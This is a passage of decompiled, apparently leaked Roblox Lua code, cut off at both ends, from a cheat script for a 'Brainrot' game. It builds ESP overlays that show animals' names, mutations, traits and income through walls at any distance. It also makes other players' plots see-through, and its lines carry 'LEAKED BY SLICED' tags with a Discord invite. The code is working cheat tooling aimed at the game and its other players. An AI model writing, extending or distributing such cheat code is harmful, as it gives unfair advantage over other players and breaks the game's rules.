			local sliced22 = obj2[arg]
			if sliced22 ~= nil then
				return sliced22
			end
			local flag12 = false

			if not tbl12[arg.Name] then  -- LEAKED BY SLICED | discord.gg/pubmethod
				if arg.Parent == arg2 then
					flag12 = true
				elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") then
					flag12 = true
				end
			end

			if flag12 or #arg:GetChildren() > 0 then
				obj2[arg] = flag12
			end

			return flag12  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn32(arg, arg2)
			while arg and arg ~= arg2 do
				if arg:IsA("Model") and slicedfn31(arg, arg2) then
					return true
				end
				arg = arg.Parent
			end

			return false
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn33(arg)
			if tbl15[arg] ~= nil then
				return
			end

			if not arg:IsA("BasePart") then
				return
			end

			if arg.Transparency >= 1 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced22 = slicedfn30(arg)
			if not sliced22 or sliced22 == sliced21 or slicedfn32(arg, sliced22) then
				return
			end
			local localTransparencyModifier = arg.LocalTransparencyModifier

			if math.abs(localTransparencyModifier - slicedn5) <= 0.001 then
				localTransparencyModifier = 0
			end

			tbl15[arg] = localTransparencyModifier

			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.LocalTransparencyModifier = math.max(localTransparencyModifier, slicedn5)
			end)
		end

		local function slicedfn34()
			for k, sliced22 in pairs(tbl15) do
				pcall(function()
					k.LocalTransparencyModifier = sliced22
				end)
			end

			table.clear(tbl15)  -- LEAKED BY SLICED | discord.gg/pubmethod
			table.clear(obj2)
			table.clear(tbl14)
			slicedn8 = 0
			flag11 = false
		end

		local function slicedfn35(arg)
			for k, sliced22 in pairs(tbl15) do
				if slicedfn30(k) == arg then
					pcall(function()
						k.LocalTransparencyModifier = sliced22  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)

					tbl15[k] = nil
				end
			end
		end

		local function slicedfn36(arg)
			if not arg or not arg.Parent then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn33(descendant)
			end
		end

		local function slicedfn37(arg)
			if sliced21 == arg then
				return
			end
			local sliced22 = sliced21
			sliced21 = arg
			if not flag10 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			if arg then
				slicedfn35(arg)
			end

			if sliced22 then
				slicedfn36(sliced22)
			end
		end

		local function slicedfn38(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedn5 = math.clamp(tonumber(arg) or 0.8, 0, 1)
			if not flag10 then
				return
			end

			for k, sliced22 in pairs(tbl15) do
				if k.Parent then
					pcall(function()
						k.LocalTransparencyModifier = math.max(sliced22, slicedn5)
					end)
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					tbl15[k] = nil
				end
			end
		end

		slicedfn10(function(arg, arg2)
			if arg == "UnfadedPlot" then
				local sliced22 = slicedfn37
				arg2 = typeof(arg2) == "Instance" and arg2
				sliced22(arg2 or nil)
			elseif arg == "ClearBaseTransparency" then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn38(arg2)
			end
		end)

		local function slicedfn39(arg)
			slicedn8 += 1
			tbl14[slicedn8] = arg
			if flag11 then
				return
			end
			flag11 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced22 = slicedn7

			task.delay(sliced20:NextNumber(0.18, 0.42), function()
				flag11 = false
				if not flag10 or sliced22 ~= slicedn7 then
					return
				end
				local sliced23 = tbl14
				local sliced24 = slicedn8
				tbl14 = {}
				slicedn8 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

				for i_ = 1, sliced24 do
					local sliced25 = sliced23[i_]

					if sliced25 and sliced25.Parent then
						slicedfn33(sliced25)
					end
				end
			end)
		end

		local function slicedfn40()
			slicedn7 += 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced22 = slicedn7

			task.spawn(function()
				local children = plots:GetChildren()
				local slicedn9 = 1

				while flag10 and sliced22 == slicedn7 and slicedn9 <= #children do
					local now = os.clock()

					while true do
						local sliced23 = children[slicedn9]
						slicedn9 += 1

						if sliced23 then  -- LEAKED BY SLICED | discord.gg/pubmethod
							slicedfn33(sliced23)

							for _, child in ipairs(sliced23:GetChildren()) do
								children[#children + 1] = child
							end
						end

						if not (slicedn9 > #children or os.clock() - now >= slicedn6) then
							continue
						end
						break
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if slicedn9 <= #children then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function slicedfn41()
			if connection then
				connection:Disconnect()
				connection = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if not plots then
				return
			end

			connection = plots.DescendantAdded:Connect(function(descendant)
				if flag10 then
					slicedfn39(descendant)
				end
			end)

			slicedfn40()  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn42()
			flag10 = false
			slicedn7 += 1

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection2 = nil
			end

			slicedfn34()
		end

		local function slicedfn43()
			slicedfn42()
			flag10 = true
			plots = Workspace:FindFirstChild("Plots")
			if plots then
				slicedfn41()  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if flag10 and child.Name == "Plots" then
					plots = child

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					slicedfn41()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end

		local function slicedfn44()
			local flag12 = tbl3.YourBaseClear == true

			if flag12 and not flag10 then
				slicedfn43()
			elseif not flag12 and flag10 then
				slicedfn42()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedfn10(function(arg)
			if arg == "YourBaseClear" then
				slicedfn44()
			end
		end)

		slicedfn44()
		bindableEvent.Event:Connect(slicedfn42)
		folder.Destroying:Connect(slicedfn42)
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	chilliBrainrotESPRuntime, sliced12 = slicedfn5("__ChilliBrainrotESPRuntime")
	local font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local tbl12 = {}
	local tbl13 = { Limit = 1000000, Outline = Color3.fromRGB(255, 232, 152) }

	do
		local colorSequence = ColorSequence.new
		local tbl14 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local sliced20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		tbl14[1] = sliced19  -- LEAKED BY SLICED | discord.gg/pubmethod
		tbl14[2] = sliced20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl14)
		end

		tbl13.Text = colorSequence(tbl14)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl14 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local sliced20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		tbl14[1] = sliced19
		tbl14[2] = sliced20

		do
			local values = table.pack(new(1, color2(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl14)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		tbl13.Stroke = colorSequence(tbl14)
	end

	local tbl14 = { Limit = 10000000, Outline = Color3.fromRGB(255, 194, 112) }

	do
		local colorSequence = ColorSequence.new
		local tbl15 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local sliced20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		tbl15[1] = sliced19
		tbl15[2] = sliced20  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl14.Text = colorSequence(tbl15)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl15 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
		tbl15[1] = sliced19
		tbl15[2] = sliced20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl14.Stroke = colorSequence(tbl15)
	end

	local tbl15 = { Limit = 100000000, Outline = Color3.fromRGB(255, 160, 132) }  -- LEAKED BY SLICED | discord.gg/pubmethod

	do
		local colorSequence = ColorSequence.new
		local tbl16 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
		local sliced20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		tbl16[1] = sliced19
		tbl16[2] = sliced20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(196, 42, 0)))
			table.move(values, 1, values.n, 3, tbl16)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		tbl15.Text = colorSequence(tbl16)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl16 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
		local sliced20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
		tbl16[1] = sliced19
		tbl16[2] = sliced20  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl16)
		end

		tbl15.Stroke = colorSequence(tbl16)
	end

	do
		local tbl16 = { Limit = math.huge, Outline = Color3.fromRGB(255, 128, 138) }
		local colorSequence = ColorSequence.new
		local tbl17 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local sliced20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		tbl17[1] = sliced19
		tbl17[2] = sliced20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl17)
		end

		tbl16.Text = colorSequence(tbl17)
		local colorSequence2 = ColorSequence.new  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl18 = {}
		local sliced21 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local sliced22 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		tbl18[1] = sliced21
		tbl18[2] = sliced22

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl18)
		end

		tbl16.Stroke = colorSequence2(tbl18)  -- LEAKED BY SLICED | discord.gg/pubmethod
		tbl12[1] = tbl13
		tbl12[2] = tbl14
		tbl12[3] = tbl15
		tbl12[4] = tbl16
	end

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Animals)
		end)

		tbl4 = ok and type(result) == "table" and result or {}  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local tbl16

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Rarities)
		end)

		tbl16 = ok and type(result) == "table" and result or {}
	end

	local flag11, slicedfn30

	do  -- LEAKED BY SLICED | discord.gg/pubmethod
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Mutations)
		end)

		local tbl17 = ok and type(result) == "table" and result or {}

		local ok2, result2 = pcall(function()
			return require(ReplicatedStorage.Packages.Gradients)
		end)

		flag11 = ok2 and type(result2) == "table" and result2 or nil
		local tbl18 = {}

		local ok3, result3 = pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			return require(ReplicatedStorage.Datas.Traits)
		end)

		local tbl19 = ok3 and type(result3) == "table" and result3 or {}

		for k, sliced19 in pairs(tbl19) do
			if type(sliced19) == "table" then
				sliced19.TraitKey = k

				if sliced19.Icon then
					local str = tostring(sliced19.Icon)
					tbl18[str] = sliced19
					local match = str:match("%d+")  -- LEAKED BY SLICED | discord.gg/pubmethod

					if match then
						tbl18[match] = sliced19
					end
				end
			end
		end

		flag2 = false
		tbl5 = {}
		tbl6 = {}
		slicedn2 = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
		flag3 = false
		flag4 = false
		slicedn3 = 1000000
		tbl7 = { Name = true, Mutation = true, Value = true, Trails = true, Rarity = false }

		tbl8 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
		}

		slicedfn30 = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			for _, sliced19 in ipairs(tbl12) do
				if arg < sliced19.Limit then
					return sliced19
				end
			end

			return tbl12[#tbl12]
		end

		local function slicedfn31(arg)
			local sliced19 = tbl4[arg]
			if type(sliced19) == "table" and sliced19.Rarity then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return tostring(sliced19.Rarity)
			end
			return nil
		end

		local function slicedfn32(arg)
			if arg >= 1e9 then
				return string.format("$%.2fB/s", arg / 1e9)
			end

			if arg >= 1000000 then
				return string.format("$%.2fM/s", arg / 1000000)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if arg >= 1000 then
				return string.format("$%.1fK/s", arg / 1000)
			end
			return string.format("$%d/s", math.floor(arg))
		end

		local function slicedfn33(arg, arg2)
			local debris = Workspace:FindFirstChild("Debris")
			if not debris then
				return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local sliced19 = nil
			local sliced20 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name then
						local magnitude = (child.Position - arg2.Position).Magnitude

						if not sliced19 or magnitude < sliced19 then  -- LEAKED BY SLICED | discord.gg/pubmethod
							sliced19 = magnitude
							sliced20 = animalOverhead
						end
					end
				end
			end

			if sliced20 and sliced19 and sliced19 <= 14 then
				return sliced20
			end
			return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn34(arg)
			if arg.CachedOverhead and arg.CachedOverhead.Parent then
				return arg.CachedOverhead
			end
			local sliced19 = slicedfn33(arg.Model, arg.Root)
			arg.CachedOverhead = sliced19
			return sliced19
		end

		local function slicedfn35(arg, arg2, arg3)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local mutation = arg3 or slicedfn33(arg, arg2)
			mutation = mutation and mutation:FindFirstChild("Mutation")
			if not (mutation and mutation:IsA("TextLabel") and mutation.Visible) then
				return nil
			end
			local str = tostring(mutation.Text or "")
			if str == "" then
				return nil
			end

			local tbl20 = {  -- LEAKED BY SLICED | discord.gg/pubmethod
				Text = str,
				RichText = mutation.RichText == true,
				Color = mutation.TextColor3,
				Font = mutation.FontFace,
				StrokeColor = nil,
				Gradient = nil,
				SourceGrad = mutation:FindFirstChildOfClass("UIGradient"),
			}

			local uiStroke = mutation:FindFirstChildOfClass("UIStroke")

			if uiStroke then  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl20.StrokeColor = uiStroke.Color
			end

			if tbl20.SourceGrad then
				tbl20.Gradient = {
					Color = tbl20.SourceGrad.Color,
					Rotation = tbl20.SourceGrad.Rotation,
					Offset = tbl20.SourceGrad.Offset,
				}
			end

			return tbl20  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn36(arg)
			if not arg or arg == "" then
				return nil
			end
			local match, sliced19 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

			if match then
				local slicedn8 = tonumber(match) or 0
				local str = sliced19:upper()

				if str == "K" then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn8 *= 1000
				elseif str == "M" then
					slicedn8 *= 1000000
				elseif str == "B" then
					slicedn8 *= 1e9
				elseif str == "T" then
					slicedn8 *= 1e12
				end

				return slicedn8
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			return nil
		end

		local function slicedfn37(arg, arg2, arg3, arg4)
			local sliced19 = tbl4[arg]
			local slicedn8 = type(sliced19) == "table" and tonumber(sliced19.Generation) or 0
			if slicedn8 <= 0 then
				return slicedfn36(arg4) or 0
			end
			local sliced20 = arg2 and tbl17 and tbl17[arg2]
			local slicedn9 = 1  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced20 then
				slicedn9 = 1 + (tonumber(tbl17[arg2].Modifier) or 0)
			end

			local sliced21 = arg3 and tbl19
			local flag12 = false

			if sliced21 then
				for _, sliced22 in ipairs(arg3) do
					local sliced23 = tbl19[sliced22] or tbl19[sliced22:gsub("_", " ")]

					if sliced23 then
						if sliced22 == "Sleepy" or sliced23.Name == "Sleepy" then  -- LEAKED BY SLICED | discord.gg/pubmethod
							flag12 = true
						else
							slicedn9 += tonumber(sliced23.MultiplierModifier) or 0
						end
					end
				end
			end

			local sliced22 = math.round(slicedn8 * slicedn9 * (flag12 and 0.5 or 1))
			local sliced23 = slicedfn36(arg4)
			if sliced23 and sliced23 > sliced22 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return sliced23
			end
			return sliced22 > 0 and sliced22 or (sliced23 or slicedn8)
		end

		local function slicedfn38(arg, arg2, arg3)
			local tbl20 = {}
			local tbl21 = {}
			local tbl22 = {}
			local tbl23 = {}

			local function slicedfn39(arg4, arg5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if arg4 and not tbl23[arg4] then
					tbl23[arg4] = true
					table.insert(tbl21, arg4)
				end

				if arg5 and arg5 ~= "" and arg5 ~= "rbxassetid://110835412437000" then
					local match = tostring(arg5):match("%d+")
					local str = match or tostring(arg5)

					if not tbl22[str] then
						tbl22[str] = true
						local str2 = tostring(arg5)  -- LEAKED BY SLICED | discord.gg/pubmethod

						if not str2:find("://") and match then
							str2 = "rbxassetid://" .. match
						end

						table.insert(tbl20, str2)
					end
				end
			end

			local traits = arg3 or slicedfn33(arg, arg2)
			traits = traits and traits:FindFirstChild("Traits")

			if traits and traits.Visible then  -- LEAKED BY SLICED | discord.gg/pubmethod
				for _, child in ipairs(traits:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image and child.Image ~= "" then
						local str = tostring(child.Image)
						local match = str:match("%d+")
						local traitKey = tbl18[str] or match and tbl18[match]

						if traitKey then
							traitKey = traitKey.TraitKey or traitKey.Display or traitKey.Name
						end

						slicedfn39(traitKey, child.Image)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			for _, child in ipairs(arg:GetChildren()) do
				local match = child.Name:match("^_Trait%.(.+)$")

				if match then
					local sliced19 = tbl19[match] or tbl19[match:gsub("_", " ")]
					slicedfn39(match, sliced19 and sliced19.Icon)
				end
			end

			local attribute = arg:GetAttribute("Trait") or arg:GetAttribute("Traits")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if attribute then
				local str = tostring(attribute)
				local sliced19 = tbl19[str] or tbl19[str:gsub("_", " ")]
				slicedfn39(str, sliced19 and sliced19.Icon)
			end

			return #tbl20 > 0 and tbl20 or nil, #tbl21 > 0 and tbl21 or nil
		end

		slicedfn16 = function(arg)
			return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn39(parent, layoutOrder, arg)
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, arg)
			frame.Parent = parent
			local textLabel = Instance.new("TextLabel")
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font
			textLabel.Position = UDim2.fromOffset(1, 1)  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextColor3 = Color3.fromRGB(12, 0, 2)
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextTransparency = 0.1
			textLabel.ZIndex = 2
			textLabel.Parent = frame
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel2.FontFace = font
			textLabel2.Size = UDim2.fromScale(1, 1)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextScaled = true
			textLabel2.TextStrokeTransparency = 1
			textLabel2.ZIndex = 3
			textLabel2.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiStroke.Color = Color3.fromRGB(0, 0, 0)
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round

			uiStroke.Thickness = pcall(function()
				uiStroke.BorderOffset = UDim.new(0, 0)
				uiStroke.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.6

			uiStroke.Transparency = 0.05
			uiStroke.Parent = textLabel2
			local uiGradient = Instance.new("UIGradient")  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiGradient.Rotation = 90
			uiGradient.Enabled = false
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Rotation = 90
			uiGradient2.Enabled = false
			uiGradient2.Parent = textLabel2
			return { Holder = frame, Label = textLabel2, Shadow = textLabel, Stroke = uiStroke, StrokeGradient = uiGradient, TextGradient = uiGradient2 }
		end

		local function slicedfn40(parent, layoutOrder, arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local frame = Instance.new("Frame")
			frame.Name = "TraitRow"
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, arg)
			frame.Parent = parent
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiListLayout.Padding = UDim.new(0, 3)
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			return { Holder = frame, Layout = uiListLayout, Icons = {}, CurrentKey = "" }
		end

		slicedfn17 = function(adornee, adornee2)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BrainrotTag"
			billboardGui.Adornee = adornee2
			billboardGui.AlwaysOnTop = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			billboardGui.ClipsDescendants = false
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = math.huge
			billboardGui.Size = UDim2.fromOffset(220, 95)
			billboardGui.StudsOffsetWorldSpace = Vector3.new(0, 4.4, 0)
			billboardGui.Parent = adornee2
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui  -- LEAKED BY SLICED | discord.gg/pubmethod
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
			uiListLayout.Parent = frame
			local sliced19 = slicedfn33(adornee, adornee2)
			local text = sliced19 and sliced19:FindFirstChild("Generation") and sliced19.Generation.Text
			local text2 = sliced19 and sliced19:FindFirstChild("Mutation") and sliced19.Mutation.Visible and sliced19.Mutation.Text

			if not text2 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local attribute = adornee:GetAttribute("Mutation") or adornee:GetAttribute("__mutation")

				if attribute and tostring(attribute) ~= "" then
					text2 = tostring(attribute)
				end
			end

			local sliced20, sliced21 = slicedfn38(adornee, adornee2)
			local sliced22 = slicedfn37(adornee.Name, text2, sliced21, text)

			local tbl20 = {
				Model = adornee,
				Root = adornee2,  -- LEAKED BY SLICED | discord.gg/pubmethod
				Billboard = billboardGui,
				Column = frame,
				RarityRow = slicedfn39(frame, 0, 16),
				TraitRow = slicedfn40(frame, 1, 18),
				MutationRow = slicedfn39(frame, 2, 15),
				NameRow = slicedfn39(frame, 3, 19),
				ValueRow = slicedfn39(frame, 4, 16),
				Name = adornee.Name,
				Generation = sliced22,
			}  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl20.RarityRow.Label.RichText = true
			tbl20.MutationRow.Label.RichText = true
			tbl20.RarityRow.Holder.Visible = false
			tbl20.TraitRow.Holder.Visible = false
			local sliced23 = slicedfn30(tbl20.Generation)
			tbl20.NameRow.TextGradient.Color = sliced23.Text
			tbl20.NameRow.TextGradient.Enabled = true
			tbl20.NameRow.StrokeGradient.Color = sliced23.Stroke
			tbl20.NameRow.StrokeGradient.Enabled = true
			tbl20.ValueRow.TextGradient.Enabled = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl20.ValueRow.StrokeGradient.Enabled = false
			tbl20.ValueRow.Label.TextColor3 = Color3.fromRGB(115, 255, 0)
			tbl20.ValueRow.Shadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			tbl20.ValueRow.Stroke.Transparency = 0.3
			tbl20.NameRow.Label.Text = tbl20.Name
			tbl20.NameRow.Shadow.Text = tbl20.Name
			local sliced24 = slicedfn32(tbl20.Generation)
			tbl20.ValueRow.Label.Text = sliced24
			tbl20.ValueRow.Shadow.Text = sliced24
			local highlight2 = Instance.new("Highlight")  -- LEAKED BY SLICED | discord.gg/pubmethod
			highlight2.Name = "BrainrotHighlight"
			highlight2.Adornee = adornee
			highlight2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight2.FillColor = sliced23.Outline
			highlight2.FillTransparency = 0.86
			highlight2.OutlineColor = sliced23.Outline
			highlight2.OutlineTransparency = 0.3
			highlight2.Enabled = false
			highlight2.Parent = adornee
			tbl20.Highlight = highlight2  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl20.BeamTint = sliced23.Outline
			return tbl20
		end

		slicedfn18 = function(arg)
			local floor = math.floor
			local slicedn8 = 95 * slicedn2
			arg.Billboard.Size = UDim2.fromOffset(math.floor(220 * slicedn2), floor(slicedn8))
			arg.RarityRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * slicedn2))
			local slicedn9 = math.floor(18 * slicedn2)
			arg.TraitRow.Holder.Size = UDim2.new(1, 0, 0, slicedn9)  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, icon in ipairs(arg.TraitRow.Icons) do
				icon.Size = UDim2.fromOffset(slicedn9, slicedn9)
			end

			arg.MutationRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(15 * slicedn2))
			arg.NameRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(19 * slicedn2))
			arg.ValueRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * slicedn2))
		end

		local function slicedfn41(arg)
			if arg.RarityGradientCleanup then
				pcall(arg.RarityGradientCleanup)  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.RarityGradientCleanup = nil
			end

			arg.ActiveRarityEffect = nil
			arg.SourceRarityGrad = nil
			arg.SourceMutationGrad = nil
		end

		slicedfn19 = function(arg, arg2)
			pcall(function()
				if not tbl7.Mutation then
					arg.MutationShown = false  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.MutationRow.Holder.Visible = false
					return
				end

				if arg2 < (arg.MutationCheckedAt or 0) then
					arg.MutationRow.Holder.Visible = arg.MutationShown == true
					return
				end
				arg.MutationCheckedAt = arg2 + 0.4
				local sliced19 = slicedfn35(arg.Model, arg.Root, slicedfn34(arg))

				if not sliced19 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.MutationShown = false
					arg.MutationRow.Holder.Visible = false
					arg.SourceMutationGrad = nil
					return
				end

				arg.MutationShown = true
				local mutationRow = arg.MutationRow
				mutationRow.Holder.Visible = true
				mutationRow.Label.RichText = sliced19.RichText
				mutationRow.Label.Text = sliced19.Text  -- LEAKED BY SLICED | discord.gg/pubmethod

				if sliced19.Color then
					mutationRow.Label.TextColor3 = sliced19.Color
				end

				if sliced19.Font then
					pcall(function()
						mutationRow.Label.FontFace = sliced19.Font
						mutationRow.Shadow.FontFace = sliced19.Font
					end)
				end

				if sliced19.StrokeColor then  -- LEAKED BY SLICED | discord.gg/pubmethod
					mutationRow.Stroke.Color = sliced19.StrokeColor
				end

				if sliced19.Gradient then
					pcall(function()
						mutationRow.TextGradient.Color = sliced19.Gradient.Color
						mutationRow.TextGradient.Rotation = sliced19.Gradient.Rotation
						mutationRow.TextGradient.Offset = sliced19.Gradient.Offset
						mutationRow.TextGradient.Enabled = true
					end)

					arg.SourceMutationGrad = sliced19.SourceGrad  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					mutationRow.TextGradient.Enabled = false
					arg.SourceMutationGrad = nil
				end

				mutationRow.Shadow.RichText = false
